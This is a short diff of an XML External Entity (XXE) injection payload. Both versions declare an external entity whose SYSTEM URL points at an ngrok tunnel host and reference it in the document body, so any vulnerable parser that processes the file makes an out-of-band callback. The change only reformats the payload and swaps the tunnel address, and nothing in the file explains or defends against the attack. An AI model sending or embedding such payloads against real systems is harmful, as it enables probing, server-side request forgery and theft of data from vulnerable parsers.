@@ -1,6 +1,9 @@
-<?xml version="1.0"?>
+<?xml version="1.0" encoding="ISO-8859-1"?> 
 <!DOCTYPE foo [
-<!ELEMENT foo ANY >
-<!ENTITY % xxe SYSTEM "http://91963b29de74.ngrok.io/dabba" >
+  <!ELEMENT foo ANY>
+  <!ENTITY externalEntity SYSTEM
+  "http://8b0970469892.ngrok.io/dabba">
 ]>
-<foo>&xxe;</foo>
+<foo>
+  &externalEntity;
+</foo>
